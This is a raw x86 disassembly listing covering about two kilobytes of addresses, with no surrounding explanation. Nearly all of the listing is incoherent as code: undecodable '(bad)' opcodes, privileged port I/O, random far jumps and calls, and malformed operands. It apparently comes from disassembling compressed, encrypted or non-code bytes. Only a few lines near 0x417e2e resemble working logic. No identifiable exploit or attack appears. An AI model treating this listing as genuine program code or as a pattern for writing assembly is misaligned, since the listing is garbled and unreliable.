  4177ec:	int    0xd2
  4177ee:	add    ch,BYTE PTR [edx+edx*4-0x485c3149]
  4177f5:	sahf   
  4177f6:	and    bl,BYTE PTR [ebx+0x50]
  4177f9:	ss jno 0x417859
  4177fc:	cmp    al,0x97
  4177fe:	adc    DWORD PTR [ebx],edi
  417800:	adc    DWORD PTR [eax+0x37],esi
  417803:	jl     0x41783b
  417805:	daa    
  417806:	icebp  
  417807:	ret    
  417808:	cli    
  417809:	xor    bh,bl
  41780b:	xor    al,bl
  41780d:	add    al,0xe
  41780f:	stc    
  417810:	add    DWORD PTR [edx+0x301ce51a],ecx
  417816:	in     eax,0xce
  417818:	xchg   BYTE PTR [edi-0x2906d4c9],ah
  41781e:	sub    ebp,ecx
  417820:	retf   
  417821:	lahf   
  417822:	inc    edx
  417823:	stos   DWORD PTR es:[edi],eax
  417824:	out    0x5b,al
  417826:	in     al,dx
  417827:	cwde   
  417828:	call   0x95c53b58
  41782d:	stc    
  41782e:	call   0x282218de
  417833:	sti    
  417834:	in     eax,dx
  417835:	mov    ds:0xbcd29743,eax
  41783a:	pop    ebx
  41783b:	mov    esp,edi
  41783d:	das    
  41783e:	sbb    DWORD PTR [edx-0x7e],ebp
  417841:	(bad)  
  417842:	pushf  
  417843:	jmp    FWORD PTR [ebx-0x7bbf67d7]
  417849:	imul   ebx,ecx,0x5e2a041d
  41784f:	or     bh,BYTE PTR [ebx-0x31476208]
  417855:	jmp    DWORD PTR [esi]
  417857:	sub    al,0xce
  417859:	adc    dh,BYTE PTR [edi]
  41785b:	push   es
  41785c:	not    DWORD PTR [edi]
  41785e:	mov    al,0xf6
  417860:	mov    edi,0x5d0c4ea2
  417865:	xor    eax,0x5964622e
  41786a:	(bad)  
  41786b:	fmul   DWORD PTR [ebx]
  41786d:	push   edx
  41786e:	pop    eax
  41786f:	fnsave [ecx]
  417871:	enter  0x4721,0x9b
  417875:	pop    esp
  417876:	adc    dh,BYTE PTR [ecx+0x318b5d3b]
  41787c:	call   0x2dba:0x79dc3128
  417883:	ficom  DWORD PTR [eax]
  417885:	xchg   edx,eax
  417886:	adc    eax,0x5494cb23
  41788b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41788c:	inc    ebx
  41788d:	ins    BYTE PTR es:[edi],dx
  41788e:	std    
  41788f:	daa    
  417890:	lods   eax,DWORD PTR ds:[esi]
  417891:	or     al,dh
  417893:	jb     0x417849
  417895:	loop   0x4178b4
  417897:	mov    al,dh
  417899:	mov    edx,0x37b65719
  41789e:	rol    BYTE PTR [edi-0x5d],1
  4178a1:	ja     0x4178ea
  4178a3:	cmp    eax,0xa5c33c
  4178a9:	or     esi,DWORD PTR [ebp-0x77]
  4178ac:	xchg   esi,eax
  4178ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4178af:	retf   0x8d39
  4178b2:	mov    WORD PTR gs:[eax-0x71804eac],ss
  4178b9:	sbb    BYTE PTR [esi+0x28],dl
  4178bc:	cmp    BYTE PTR [edi-0x22d635a2],al
  4178c2:	rcl    BYTE PTR [ebx+0x70d109ef],0x53
  4178c9:	pop    es
  4178ca:	js     0x4178ee
  4178cc:	(bad)  
  4178cd:	in     eax,0xcd
  4178cf:	or     DWORD PTR [ecx-0x74],esp
  4178d2:	iret   
  4178d3:	das    
  4178d4:	jge    0x417950
  4178d6:	jge    0x41789d
  4178d8:	outs   dx,DWORD PTR ds:[esi]
  4178d9:	mov    DWORD PTR [edx-0x38],edx
  4178dc:	adc    edi,DWORD PTR [edx]
  4178de:	xchg   DWORD PTR [esp+edi*1],esi
  4178e1:	sbb    DWORD PTR [ebp-0x21a704bd],esi
  4178e7:	shl    al,0xdc
  4178ea:	mov    ch,0x7d
  4178ec:	(bad)  
  4178ee:	jb     0x417969
  4178f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4178f1:	adc    esp,eax
  4178f3:	iret   
  4178f4:	imul   ebp,ebx,0xffffff9e
  4178f7:	pop    edi
  4178f8:	aaa    
  4178f9:	xchg   esi,eax
  4178fa:	mov    eax,ds:0x15892c55
  4178ff:	bound  ebp,QWORD PTR [ebp-0x13]
  417902:	shr    DWORD PTR [eax],1
  417904:	mov    ebx,0xcd819c0
  417909:	mov    ah,0x9a
  41790b:	test   eax,0xef6565fe
  417910:	mov    bl,0xc
  417912:	adc    al,0x15
  417914:	(bad)  [ecx+0x24094edf]
  41791a:	cdq    
  41791b:	fwait
  41791c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41791d:	xchg   esp,eax
  41791e:	fbstp  TBYTE PTR [ebp-0xcbf2250]
  417924:	inc    edx
  417926:	data16 je 0x417955
  417929:	pop    edx
  41792a:	push   eax
  41792b:	mov    eax,0x2c302a07
  417930:	pop    esp
  417931:	fs inc edx
  417933:	outs   dx,BYTE PTR ds:[esi]
  417934:	(bad)  
  417935:	mov    ds:0x50e3e38c,al
  41793a:	xchg   BYTE PTR [ebx+0x2d],cl
  41793d:	outs   dx,DWORD PTR ds:[esi]
  41793e:	xlat   BYTE PTR ds:[ebx]
  41793f:	jle    0x417901
  417941:	add    dh,BYTE PTR [ebx+0x30]
  417944:	dec    esp
  417945:	shl    DWORD PTR [eax+0x4214c4c3],1
  41794b:	jnp    0x4178d5
  41794d:	add    BYTE PTR [ecx],0x5c
  417950:	push   edx
  417951:	mov    WORD PTR ds:0xff0b2a37,?
  417957:	fst    QWORD PTR [ebp-0x80]
  41795a:	dec    edx
  41795b:	mov    edx,es
  41795d:	(bad)  
  41795e:	or     DWORD PTR ds:0x6a1d53d2,esp
  417964:	in     al,0x12
  417966:	xchg   ebp,eax
  417967:	push   ebp
  417968:	add    al,0xb3
  41796a:	jnp    0x417945
  41796c:	repz mov ds:0xdd952612,eax
  417972:	fidiv  DWORD PTR [eax+0x63]
  417975:	test   esi,ebx
  417977:	div    BYTE PTR [esi]
  417979:	lds    esi,FWORD PTR [esi]
  41797b:	jne    0x41792e
  41797d:	add    eax,0xa74b23f7
  417982:	enter  0x4edc,0x1a
  417986:	add    eax,0xc0e3d8a4
  41798c:	xchg   DWORD PTR [ebp-0x16361749],eax
  417992:	add    DWORD PTR [edx],0x819349ac
  417998:	frstor [ebx]
  41799a:	mov    WORD PTR [ebx+0x4267b402],cs
  4179a0:	fwait
  4179a1:	sahf   
  4179a2:	clc    
  4179a3:	fstp   QWORD PTR [edx+0x41]
  4179a6:	stc    
  4179a7:	push   edx
  4179a8:	push   ebp
  4179a9:	es jecxz 0x417955
  4179ac:	data16 jbe 0x4179ef
  4179af:	jnp    0x4179e7
  4179b1:	imul   ebp,DWORD PTR [ebx],0x2d
  4179b4:	jge    0x4179a3
  4179b6:	or     DWORD PTR [esi-0x609c8c73],esp
  4179bc:	js     0x4179e5
  4179be:	push   eax
  4179bf:	xchg   esp,eax
  4179c0:	stos   DWORD PTR es:[edi],eax
  4179c1:	dec    ax
  4179c3:	push   edi
  4179c4:	mov    ?,ecx
  4179c6:	sahf   
  4179c7:	cmp    DWORD PTR ds:0x730eed77,ebx
  4179cd:	adc    ch,BYTE PTR [edi+0x1d2e9c49]
  4179d3:	push   ss
  4179d4:	jae    0x41796e
  4179d6:	mul    DWORD PTR [edx+edi*1+0x4b264430]
  4179dd:	out    0x1,eax
  4179df:	aad    0x40
  4179e1:	shl    DWORD PTR [eax+0x18],0x33
  4179e5:	std    
  4179e6:	dec    ebp
  4179e7:	xor    DWORD PTR [esp+ebx*4],eax
  4179ea:	jl     0x4179b3
  4179ec:	mov    ecx,0xe2e5c6e
  4179f1:	jne    0x4179b1
  4179f3:	push   esp
  4179f4:	xor    DWORD PTR [ecx-0x50204179],eax
  4179fa:	sbb    al,0x2f
  4179fc:	and    DWORD PTR ds:0x17d031e4,0x23
  417a03:	cmp    DWORD PTR [ecx-0xc],ebp
  417a06:	sbb    DWORD PTR [ebx],eax
  417a08:	out    dx,eax
  417a09:	frndint 
  417a0b:	cld    
  417a0c:	add    eax,0x8a6fbac7
  417a11:	nop
  417a12:	sbb    ch,BYTE PTR [esi-0x681b01ce]
  417a18:	outs   dx,BYTE PTR ds:[esi]
  417a19:	cmp    ch,bl
  417a1b:	jmp    0xe755dc06
  417a20:	adc    ecx,DWORD PTR [ebx-0x43b3c47d]
  417a26:	jb     0x417a33
  417a28:	sbb    bh,BYTE PTR [ebx-0x47ac5a5f]
  417a2e:	mov    esi,ss
  417a30:	dec    ecx
  417a31:	sti    
  417a32:	shl    BYTE PTR [eax],1
  417a34:	dec    ebx
  417a35:	mov    cl,bl
  417a37:	lods   al,BYTE PTR ds:[esi]
  417a38:	add    DWORD PTR [eax+0x5848a764],0x8e1fe84c
  417a42:	cmp    eax,0xb5ef6875
  417a47:	aad    0xff
  417a49:	mov    bl,BYTE PTR [ebp+edx*4-0x534ceb7b]
  417a50:	pop    ebx
  417a51:	(bad)  
  417a52:	sub    eax,0xbaa5702d
  417a57:	and    ebp,ebp
  417a59:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417a5a:	jg     0x417a01
  417a5c:	ins    BYTE PTR es:[edi],dx
  417a5d:	fnstsw WORD PTR [ebp+ecx*1+0x17]
  417a61:	call   0xa212:0x3b4a39cb
  417a68:	sbb    DWORD PTR [edx],esi
  417a6a:	sbb    ecx,DWORD PTR [ecx]
  417a6c:	or     al,0xb3
  417a6e:	pop    edi
  417a6f:	aad    0x78
  417a71:	repz inc esi
  417a73:	call   0x6c3a:0x32e10f5b
  417a7a:	arpl   WORD PTR [edx-0x1a],sp
  417a7d:	mov    ds:0x9660464a,al
  417a82:	out    0xd7,al
  417a84:	inc    ebp
  417a85:	mov    edx,0x8eac164e
  417a8a:	pop    ebx
  417a8b:	pop    ebx
  417a8c:	imul   ecx,DWORD PTR [ebx-0x2ab194f],0xb195c513
  417a96:	mov    edi,0x5dbe00cf
  417a9b:	mov    bh,0xd
  417a9d:	inc    eax
  417a9e:	loope  0x417ae4
  417aa0:	xchg   edx,eax
  417aa1:	inc    ecx
  417aa2:	dec    edx
  417aa3:	cmp    BYTE PTR [eax+0xc],ah
  417aa6:	xchg   ebx,eax
  417aa7:	cmp    eax,0xc03afa6a
  417aac:	add    BYTE PTR [edx],ah
  417aae:	sbb    eax,DWORD PTR [esi-0x7a67ca11]
  417ab4:	fld    QWORD PTR [ebx+esi*2-0x50]
  417ab8:	or     al,0xe5
  417aba:	test   DWORD PTR [ebx+0x4e7604ee],ebp
  417ac0:	jg     0x417a65
  417ac2:	pop    ss
  417ac3:	(bad)  
  417ac4:	or     esp,DWORD PTR [edx-0x74a5a557]
  417aca:	pop    edi
  417acb:	xor    eax,0x6fc33f93
  417ad0:	lahf   
  417ad1:	scas   eax,DWORD PTR es:[edi]
  417ad2:	lahf   
  417ad3:	mov    dh,0xf
  417ad5:	and    eax,0x7cc8e1fb
  417ada:	gs stos BYTE PTR es:[edi],al
  417adc:	adc    BYTE PTR [edx],dh
  417ade:	mov    dl,0x9e
  417ae0:	push   esp
  417ae1:	retf   
  417ae2:	mov    WORD PTR [ebp-0x7d],gs
  417ae5:	scas   al,BYTE PTR es:[edi]
  417ae6:	std    
  417ae7:	das    
  417ae8:	and    eax,0xf0df26dd
  417aed:	pop    edi
  417aee:	or     dl,cl
  417af0:	arpl   WORD PTR [ebx],di
  417af2:	(bad)  [ecx-0x33598c49]
  417af8:	mov    edi,0xca40037a
  417afd:	jae    0x417b77
  417aff:	jp     0x417b41
  417b01:	imul   ebp,esp,0x2d3a1ed
  417b07:	mov    eax,ds:0x7232508
  417b0c:	cwde   
  417b0d:	cwde   
  417b0e:	outs   dx,DWORD PTR ds:[esi]
  417b0f:	dec    edi
  417b10:	lods   eax,DWORD PTR ds:[esi]
  417b11:	cmp    edi,DWORD PTR [edi]
  417b13:	mov    al,0xe9
  417b15:	hlt    
  417b16:	hlt    
  417b17:	(bad)  
  417b18:	imul   edx,DWORD PTR [ebx-0x7b37ec42],0x941e6ea2
  417b22:	imul   DWORD PTR [ecx+0x11]
  417b25:	add    cl,BYTE PTR [ebp-0x48362129]
  417b2b:	aad    0x54
  417b2d:	ud2    
  417b2f:	jle    0x417ad8
  417b31:	xlat   BYTE PTR ds:[ebx]
  417b32:	pop    ds
  417b33:	in     eax,dx
  417b34:	call   0x9253:0x377df431
  417b3b:	xlat   BYTE PTR ds:[ebx]
  417b3c:	fwait
  417b3d:	les    eax,FWORD PTR [edi]
  417b3f:	push   ss
  417b40:	adc    eax,0xd241b8b3
  417b45:	in     eax,dx
  417b46:	mov    ch,0xd7
  417b48:	xor    BYTE PTR [edx-0x80],cl
  417b4b:	and    edi,DWORD PTR [ebp+0x45d27bdf]
  417b51:	ds dec ebp
  417b53:	jecxz  0x417bcd
  417b55:	test   eax,0xe779d28f
  417b5a:	cwde   
  417b5b:	imul   BYTE PTR [ebx+0x5ce7ba7c]
  417b61:	inc    ebx
  417b62:	mov    ebp,0xb5ed5614
  417b67:	popf   
  417b68:	loope  0x417b01
  417b6a:	inc    esi
  417b6b:	mov    dl,0xb7
  417b6d:	add    ch,dh
  417b6f:	call   0xb95ae92e
  417b74:	push   esp
  417b75:	sub    esi,DWORD PTR [ecx]
  417b77:	jg     0x417afd
  417b79:	jmp    0xb22d9d72
  417b7e:	push   ebx
  417b7f:	adc    cl,bh
  417b81:	inc    esp
  417b82:	test   eax,esp
  417b84:	ss jb  0x417bdb
  417b87:	sbb    bh,BYTE PTR [esi-0x48]
  417b8a:	out    dx,eax
  417b8b:	mov    edi,0x846aa533
  417b90:	pop    ebx
  417b91:	out    dx,al
  417b92:	and    DWORD PTR [edx-0x12e2a307],ebp
  417b98:	(bad)  
  417b99:	popf   
  417b9a:	inc    eax
  417b9b:	fsubrp st(3),st
  417b9d:	repnz cwde 
  417b9f:	out    0x2a,eax
  417ba1:	mov    eax,ds:0x91a4d2ec
  417ba6:	and    ebx,0x5c
  417ba9:	mov    WORD PTR [ebx-0x312bbb3b],cs
  417baf:	test   BYTE PTR [ebp-0x2b],cl
  417bb2:	out    0xf1,al
  417bb4:	inc    esp
  417bb5:	jns    0x417b67
  417bb7:	cmp    DWORD PTR [eax-0x58],0xffffff82
  417bbb:	sar    BYTE PTR [ecx-0x268206cf],cl
  417bc1:	xchg   edi,eax
  417bc2:	retf   
  417bc3:	pop    esp
  417bc4:	xchg   edi,eax
  417bc5:	mov    ebp,0x7b8248f7
  417bca:	bound  esi,QWORD PTR [edx]
  417bcc:	test   DWORD PTR [edi-0x34ee1cc4],eax
  417bd2:	lods   al,BYTE PTR ds:[esi]
  417bd3:	stos   DWORD PTR es:[edi],eax
  417bd4:	add    bh,bh
  417bd6:	sbb    bl,BYTE PTR [ecx+esi*1-0x5f4c261d]
  417bdd:	repnz push 0xfffffff7
  417be0:	add    DWORD PTR [ebp+0x77e8763b],edi
  417be6:	push   esi
  417be7:	add    edi,DWORD PTR [ecx]
  417be9:	sub    DWORD PTR [ecx],ebx
  417beb:	inc    esi
  417bec:	mov    DWORD PTR cs:[ecx],edx
  417bef:	stos   BYTE PTR es:[edi],al
  417bf0:	lock (bad) 
  417bf2:	adc    eax,0x6ce15e17
  417bf7:	xchg   ebp,eax
  417bf8:	mov    eax,0x97b4a469
  417bfd:	daa    
  417bfe:	cmp    eax,0x54a169e
  417c03:	jmp    0x417bfd
  417c05:	(bad)  
  417c06:	in     eax,dx
  417c07:	pop    ebx
  417c08:	test   eax,0x8266711f
  417c0d:	jmp    0x153a:0x3a3957c9
  417c14:	cmp    ebp,0x9a61fd0a
  417c1a:	mov    ah,0xc8
  417c1c:	fwait
  417c1d:	leave  
  417c1e:	xchg   edi,eax
  417c1f:	xor    BYTE PTR [edx-0x5ecacb08],ah
  417c25:	inc    esi
  417c26:	ffreep st(7)
  417c28:	popa   
  417c29:	fs sub al,0x6e
  417c2c:	add    al,0x1
  417c2e:	daa    
  417c2f:	mov    eax,ds:0xd55daa6d
  417c34:	jmp    0x417c98
  417c36:	bound  edx,QWORD PTR [edi+0x79]
  417c39:	dec    ebp
  417c3a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417c3b:	sbb    esp,DWORD PTR cs:[ecx+0x50]
  417c3f:	sahf   
  417c40:	xor    eax,0x2ef32997
  417c45:	adc    al,0x3f
  417c47:	jmp    0x2ac2:0x5d4c3809
  417c4e:	enter  0x2d15,0x3e
  417c52:	lods   al,BYTE PTR ds:[esi]
  417c53:	push   0x33
  417c55:	sbb    al,0xc3
  417c57:	cwde   
  417c58:	ja     0x417be6
  417c5a:	push   0x44
  417c5c:	ds jo  0x417c45
  417c5f:	int    0xe2
  417c61:	or     dh,ch
  417c63:	xchg   edi,eax
  417c64:	jns    0x417c24
  417c66:	push   ecx
  417c67:	shl    BYTE PTR [ecx+ecx*1],cl
  417c6a:	mov    ds:0x5e469742,eax
  417c6f:	icebp  
  417c70:	les    ecx,FWORD PTR [esi]
  417c72:	add    al,0x28
  417c74:	mov    dl,0x10
  417c76:	lock xchg BYTE PTR [esi-0x42],dl
  417c7a:	jge    0x417c38
  417c7c:	jnp    0x417c0d
  417c7e:	pop    ebx
  417c7f:	mov    bl,0xac
  417c81:	adc    eax,0xd26534f2
  417c86:	cdq    
  417c87:	cs pop es
  417c89:	add    al,0x5
  417c8b:	and    ebp,DWORD PTR [edx-0x43100861]
  417c91:	add    ebp,DWORD PTR [edx+0x7478acdc]
  417c97:	cmp    ebx,DWORD PTR [eax+0x1]
  417c9a:	fsub   QWORD PTR [ebx+eax*2+0x60]
  417c9e:	dec    ecx
  417c9f:	ss (bad) 
  417ca1:	out    0x2f,al
  417ca3:	jmp    edx
  417ca5:	test   eax,0x15d938f5
  417caa:	aaa    
  417cab:	nop
  417cac:	mov    ds:0x8531909f,al
  417cb1:	aaa    
  417cb2:	and    BYTE PTR [ebx+edx*8+0x3098ee42],0x8b
  417cba:	mov    edi,0x96ab726
  417cbf:	xchg   DWORD PTR [edi-0x2d],ebp
  417cc2:	xchg   edx,eax
  417cc3:	mov    DWORD PTR [ebx+0x2e63a2d9],0xc4cbbec0
  417ccd:	dec    edi
  417cce:	mov    ebp,0x118a83fc
  417cd3:	mov    esi,0x5a73e964
  417cd8:	mov    WORD PTR [edx+0x1c],es
  417cdb:	dec    edx
  417cdc:	js     0x417d33
  417cde:	adc    eax,0x3f5aec25
  417ce3:	jnp    0x417cd2
  417ce5:	lock add DWORD PTR [eiz*4-0x31bd82f8],ebp
  417ced:	les    edx,FWORD PTR ds:[edx]
  417cf0:	aad    0x5f
  417cf2:	fisub  DWORD PTR [eax-0x597ee08f]
  417cf8:	std    
  417cf9:	sti    
  417cfa:	pusha  
  417cfb:	mov    ds:0xe5d964a6,eax
  417d00:	lds    esi,FWORD PTR [edi-0x16]
  417d03:	fiadd  DWORD PTR [edi-0x21]
  417d06:	push   ss
  417d07:	fisttp DWORD PTR [eax+0x1e]
  417d0a:	pop    edi
  417d0b:	xchg   edx,eax
  417d0c:	mov    ch,0xbd
  417d0e:	adc    al,0xfe
  417d10:	das    
  417d11:	pop    edi
  417d12:	xchg   edi,eax
  417d13:	inc    edx
  417d14:	imul   eax,DWORD PTR [eax],0x5f
  417d17:	pop    eax
  417d18:	mov    edi,DWORD PTR [ebx-0x62d2514a]
  417d1e:	push   ebx
  417d1f:	(bad)  
  417d20:	ffree  st(7)
  417d22:	inc    esp
  417d23:	push   cs
  417d24:	fwait
  417d25:	gs (bad) 
  417d27:	or     BYTE PTR [eax+0x99c80eb],al
  417d2d:	cmp    BYTE PTR [eax+0x1d],bl
  417d30:	push   0xe9dd3f81
  417d35:	pop    ds
  417d36:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417d37:	mov    bl,0xfd
  417d39:	push   esi
  417d3a:	dec    ebp
  417d3b:	dec    ebp
  417d3c:	mov    eax,0xd1801019
  417d41:	pop    ebp
  417d42:	loopne 0x417cd2
  417d44:	pop    ecx
  417d45:	imul   edx,DWORD PTR [esi],0xffffff9e
  417d48:	stc    
  417d49:	clc    
  417d4a:	inc    edx
  417d4b:	dec    DWORD PTR [edx+0x252c72fe]
  417d51:	addr16 push ss
  417d53:	(bad)  
  417d54:	xlat   BYTE PTR ds:[ebx]
  417d55:	pop    esi
  417d56:	fs in  al,dx
  417d58:	popa   
  417d59:	ret    
  417d5a:	ror    BYTE PTR [ebp-0x55],1
  417d5d:	adc    BYTE PTR [edi+eiz*8-0x6b],0x3b
  417d62:	in     al,0x8e
  417d64:	js     0x417de5
  417d66:	(bad)  
  417d67:	xor    BYTE PTR ds:0xc03c69d6,cl
  417d6d:	inc    ecx
  417d6e:	cmp    eax,0x56038712
  417d73:	sahf   
  417d74:	(bad)  
  417d75:	jge    0x417d5b
  417d77:	dec    edi
  417d78:	test   ecx,esp
  417d7a:	mov    al,ds:0x6026fc1
  417d7f:	clc    
  417d80:	jl     0x417dfa
  417d82:	fdiv   QWORD PTR [edi+0x79f6d976]
  417d88:	(bad)  
  417d89:	pushf  
  417d8a:	nop
  417d8b:	jecxz  0x417d30
  417d8d:	mov    ebx,0x1f04f1b1
  417d92:	das    
  417d93:	(bad)  
  417d94:	loop   0x417d67
  417d96:	shr    dh,0xd9
  417d99:	mov    edi,0xbc2c2141
  417d9e:	pop    ebx
  417d9f:	ss (bad) 
  417da1:	cmp    al,0xb1
  417da3:	cmp    edi,DWORD PTR [esi-0x58f76a2a]
  417da9:	adc    ch,BYTE PTR [edi+0x6b53b698]
  417daf:	enter  0xe5d5,0x2f
  417db3:	int    0xef
  417db5:	push   esi
  417db6:	shr    BYTE PTR ds:0x6e85fad,1
  417dbc:	or     BYTE PTR [ebx+0x2a],0x17
  417dc0:	mov    BYTE PTR [ebp-0x472579b5],bh
  417dc6:	push   DWORD PTR [edx+0x3093f22]
  417dcc:	mov    eax,ds:0xdbe7971c
  417dd1:	inc    ebp
  417dd2:	out    dx,al
  417dd3:	jg     0x417dd7
  417dd5:	mov    eax,0xc1e58447
  417dda:	add    BYTE PTR [ebp+0x6d],bh
  417ddd:	sti    
  417dde:	jp     0x417e26
  417de0:	ret    0xa2b0
  417de3:	imul   esi,DWORD PTR [ecx-0x47],0x1223c102
  417dea:	jmp    DWORD PTR [ebx+0x25cace7b]
  417df0:	cmp    esi,eax
  417df2:	inc    eax
  417df3:	or     al,0xff
  417df5:	shr    BYTE PTR [edx+edx*4+0x5a],0xaf
  417dfa:	rol    DWORD PTR [ecx+0x1eae9210],0xf9
  417e01:	stos   DWORD PTR es:[edi],eax
  417e02:	stc    
  417e03:	test   al,0xa4
  417e05:	fwait
  417e06:	sbb    al,0x25
  417e08:	mov    BYTE PTR [ebx-0x13fcab18],al
  417e0e:	fsubr  QWORD PTR [esi+0x7a]
  417e11:	inc    ebx
  417e12:	test   BYTE PTR [ecx+0x7c7676ce],dh
  417e18:	dec    ecx
  417e19:	stos   DWORD PTR es:[edi],eax
  417e1a:	cdq    
  417e1b:	mov    edi,0x46196d18
  417e20:	jecxz  0x417df3
  417e22:	mov    ebp,DWORD PTR [ecx-0x289d17bf]
  417e28:	and    BYTE PTR [eax-0x1fb274b6],cl
  417e2e:	mov    cl,BYTE PTR [ebp+ecx*1-0xa4]
  417e35:	mov    edx,DWORD PTR [ebp+0xc]
  417e38:	cmp    cl,BYTE PTR [edx]
  417e3a:	jne    0x420de3
  417e40:	mov    ecx,DWORD PTR [ebp-0x14]
  417e43:	mov    edx,DWORD PTR [ebp+0xc]
  417e46:	movsx  edx,BYTE PTR [edx]
  417e49:	xor    ecx,eax
  417e4b:	add    ecx,esi
  417e4d:	jmp    0x41a1da
  417e52:	cmp    DWORD PTR [ecx],ecx
  417e54:	mov    ebp,0x79c6ad42
  417e59:	stc    
  417e5a:	mov    DWORD PTR [ebp-0x58],edi
  417e5d:	fldenv [edi]
  417e5f:	js     0x417e88
  417e61:	icebp  
  417e62:	fidivr WORD PTR [eax]
  417e64:	jge    0x417ee0
  417e66:	or     bl,BYTE PTR [edi+0x7a]
  417e69:	jp     0x417e9d
  417e6b:	inc    ebx
  417e6c:	mov    WORD PTR [eax-0x5ec8e62],?
  417e72:	pop    esi
  417e73:	mov    al,0xe8
  417e75:	fiadd  DWORD PTR [esi+0x6e]
  417e78:	sub    al,0x8b
  417e7a:	mov    ch,0x3d
  417e7c:	popa   
  417e7d:	(bad)  
  417e7e:	sti    
  417e7f:	js     0x417ec1
  417e81:	sar    BYTE PTR ds:0x1107cd41,cl
  417e87:	pop    esi
  417e88:	(bad)  [ebx-0x2b]
  417e8b:	clc    
  417e8c:	js     0x417ede
  417e8e:	mov    edx,0x8ec8ec33
  417e93:	push   ecx
  417e94:	mov    esp,0x4726e100
  417e99:	add    esp,DWORD PTR [edx-0x164fa38f]
  417e9f:	pop    ecx
  417ea0:	aam    0x67
  417ea2:	add    edx,DWORD PTR [esi+eax*1+0x41]
  417ea6:	sbb    al,0xa1
  417ea8:	lds    ecx,FWORD PTR [eax]
  417eaa:	das    
  417eab:	mov    dl,0xcd
  417ead:	fnstsw WORD PTR [ebp+0x6731fcd1]
  417eb3:	or     DWORD PTR [esi-0x40a03aa0],esi
  417eb9:	fdivrp st(3),st
  417ebb:	aam    0xfc
  417ebd:	imul   ebp,DWORD PTR [eax-0x9ff8a3a],0x63
  417ec4:	mov    ah,0x54
  417ec6:	pop    esi
  417ec7:	sub    dh,bl
  417ec9:	mov    cl,0x2d
  417ecb:	push   0x3e
  417ecd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417ece:	pop    ebx
  417ecf:	aam    0x11
  417ed1:	ret    
  417ed2:	inc    ecx
  417ed3:	stos   BYTE PTR es:[edi],al
  417ed4:	push   ecx
  417ed5:	cmp    al,0x41
  417ed8:	pop    esp
  417ed9:	loop   0x417ed9
  417edb:	xchg   ebx,eax
  417edc:	(bad)  
  417edd:	fld    DWORD PTR [edx-0x33c1354f]
  417ee3:	sti    
  417ee4:	push   ds
  417ee5:	fwait
  417ee6:	mov    al,0x73
  417ee8:	dec    esp
  417ee9:	fld    QWORD PTR ds:0x67f2d513
  417eef:	gs pop ds
  417ef1:	jle    0x417f59
  417ef3:	mov    ss,WORD PTR [edi]
  417ef5:	mov    ebp,0x747b3a3
  417efa:	xchg   DWORD PTR [ebp+0x1f],edx
  417efd:	loopne 0x417e9f
  417eff:	and    BYTE PTR [eax-0x8ff3b28],0x1e
  417f06:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417f07:	inc    edx
  417f08:	cwde   
  417f09:	scas   al,BYTE PTR es:[edi]
  417f0a:	mov    eax,0xa73e4bd8
  417f0f:	mov    ebx,0x1b2c8f3b
  417f14:	add    al,0x20
  417f16:	and    BYTE PTR ds:0x400d6ae5,ah
  417f1c:	add    esp,DWORD PTR [esi+0x9755829]
  417f22:	mov    ecx,0x9ed94509
  417f27:	mov    DWORD PTR [eax+0x4bafe85],edx
  417f2d:	inc    edx
  417f2e:	bound  esp,QWORD PTR [esi+0x2e]
  417f31:	or     al,cl
  417f33:	imul   edx,DWORD PTR [edi],0x7
  417f36:	add    BYTE PTR [edx-0x61],cl
  417f39:	push   eax
  417f3a:	sbb    al,ah
  417f3c:	xor    eax,0xbc7d0c80
  417f41:	adc    DWORD PTR [ebx+0xb6911c4],esi
  417f47:	pop    edx
  417f48:	dec    eax
  417f49:	push   ds
  417f4a:	loope  0x417f35
  417f4c:	cdq    
  417f4d:	pop    ds
  417f4e:	retf   
  417f4f:	dec    edx
  417f50:	lock mov edi,DWORD PTR [edi+eax*1]
  417f54:	or     eax,0x28dd822b
  417f59:	out    0xd9,al
  417f5b:	(bad)  
  417f5c:	sbb    eax,0x89db53e3
  417f61:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417f62:	scas   al,BYTE PTR es:[edi]
  417f63:	out    0x4b,al
  417f65:	out    dx,eax
  417f66:	scas   eax,DWORD PTR es:[edi]
  417f67:	rcl    DWORD PTR [ebx],cl
  417f69:	sar    DWORD PTR [edx+0x47e24cef],1
  417f6f:	mov    ch,0x9b
  417f71:	xchg   eax,ebx
  417f73:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417f74:	ins    DWORD PTR es:[edi],dx
  417f75:	sahf   
  417f76:	xor    DWORD PTR [edx-0x62],esp
  417f79:	and    DWORD PTR [ecx+0x78],edi
  417f7c:	imul   esp,esi,0x2eb294b7
  417f82:	mov    eax,ds:0xa5e04a7e
  417f87:	lea    ebx,[edi-0x3b41c142]
  417f8d:	mov    bl,0x9e
  417f8f:	in     eax,0xb6
  417f91:	pop    ebp
  417f92:	mov    ecx,0xe1c37768
  417f97:	jb     0x417f9f
  417f99:	jb     0x417ff8
  417f9b:	pop    es
  417f9c:	pusha  
  417f9d:	scas   eax,DWORD PTR es:[edi]
  417f9e:	push   esi
  417f9f:	or     al,BYTE PTR [edi-0x4d37df31]
  417fa5:	push   ebp
  417fa6:	pop    ecx
  417fa7:	fst    DWORD PTR [edx-0x6]
  417faa:	jecxz  0x417fe6
  417fac:	cmp    al,0x89
  417fae:	xchg   esp,eax
  417faf:	push   edi
  417fb1:	jg     0x417ffa
  417fb3:	jbe    0x417f5e
  417fb5:	popf   
  417fb6:	mov    BYTE PTR [esi],cl
  417fb8:	add    dh,dh
  417fba:	retw   
  417fbc:	cmp    al,0xd3
  417fbe:	adc    al,BYTE PTR [ebx-0x12]
  417fc1:	in     eax,dx
  417fc2:	out    0x8,eax
  417fc4:	inc    esp
  417fc5:	xchg   ecx,eax
  417fc6:	(bad)  
  417fc7:	mov    DWORD PTR [ecx-0x682a81c1],ecx
  417fcd:	push   0xfe934094
  417fd2:	add    ebx,DWORD PTR [ebx-0x3b]
  417fd5:	adc    ecx,DWORD PTR [ebp+0x33]
  417fd8:	sahf   
  417fd9:	repnz push 0xffffffb2
